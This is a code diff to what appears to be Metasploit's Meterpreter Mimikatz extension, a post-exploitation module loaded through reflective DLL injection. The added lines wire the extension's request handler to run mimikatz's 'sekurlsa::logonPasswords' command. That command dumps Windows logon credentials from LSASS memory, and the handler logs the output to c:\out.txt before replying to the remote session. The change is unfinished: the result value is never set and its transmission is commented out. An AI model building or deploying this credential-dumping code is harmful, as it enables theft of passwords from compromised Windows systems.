@@ -1,23 +1,9 @@
-#ifndef _METERPRETER_SOURCE_EXTENSION_MIMIKATZ_MIMIKATZ_H
-#define _METERPRETER_SOURCE_EXTENSION_MIMIKATZ_MIMIKATZ_H
-extern "C" 
-{
-#include "../../common/common.h"
-}
-#endif
+#include "main.h"
 
-#include <io.h>
-#include <fcntl.h>
 #include <iostream>
 #include <fstream>
-
-	#include "mimikatz.h"
-
 extern "C" 
 {
-
-#include "modules/mod_mimikatz_sekurlsa.h"
-
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
@@ -30,31 +16,42 @@ extern "C"
 // second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
 #include "../../ReflectiveDLLInjection/ReflectiveLoader.c"
 
-
 // this sets the delay load hook function, see DelayLoadMetSrv.h
 EnableDelayLoadMetSrv();
+
+static string utf16toutf8(const wstring &s)
+{
+    const int size = ::WideCharToMultiByte( CP_UTF8, 0, s.c_str(), -1, NULL, 0, 0, NULL );
+
+    vector<char> buf( size );
+    ::WideCharToMultiByte( CP_UTF8, 0, s.c_str(), -1, &buf[0], size, 0, NULL );
+
+    return string( &buf[0] );
+}
 
 DWORD request_boiler(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
-	bool result = 0;
-	//std::wofstream logFile( "c:\\out.txt"); 
-    //std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf());
-	//std::wstreambuf *errbuf = std::wcerr.rdbuf(logFile.rdbuf());
+	bool iResult;
+	std::wofstream logFile("c:\\out.txt");
+	std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf()); 
+	outputStream = &logFile;
 
-	vector<wstring> * mesArguments = new vector<wstring>();
+	wstring function = (L"sekurlsa::logonPasswords");
+	vector<wstring> *args = new vector<wstring>();
 
-	//mimikatz * myMimiKatz = new mimikatz(mesArguments);
+	mimikatz * myMimiKatz = new mimikatz(args);
+	myMimiKatz->doCommandeLocale(&function, args);
+	function = (L"exit");
+	myMimiKatz->doCommandeLocale(&function, args);
+	delete myMimiKatz;
 
-	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
-	//result = mod_mimikatz_sekurlsa_wdigest::getWDigest(mesArguments);
-	/*
-	if  (mod_mimikatz_sekurlsa::searchLSASSDatas())
-	{
-		mod_mimikatz_sekurlsa::getLogonData(mesArguments, &monProvider);
-	}*/
-	
-	packet_transmit_response(result, remote, response);
+	std::wcout.rdbuf(outbuf);
+
+	//http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+	//packet_add_tlv_string(response, TLV_MIMIKATZ_RESULT, res.c_str());
+	packet_transmit_response(iResult, remote, response);
+
 	return ERROR_SUCCESS;	
 }
 
@@ -104,21 +101,3 @@ DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 	return ERROR_SUCCESS;
 }
 }
-
-
-//int wmain(int argc, wchar_t * argv[])
-//{
-//	setlocale(LC_ALL, "French_France.65001");
-//	_setmode(_fileno(stdin), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
-//	_setmode(_fileno(stdout), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
-//	_setmode(_fileno(stderr), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
-//	
-//	/*SetConsoleCP(CP_UTF8);
-//	SetConsoleOutputCP(CP_UTF8);*/
-//	
-//	vector<wstring> * mesArguments = new vector<wstring>(argv + 1, argv + argc);
-//	
-//	mimikatz * myMimiKatz = new mimikatz(mesArguments);
-//	delete myMimiKatz, mesArguments;
-//	return ERROR_SUCCESS;
-//}
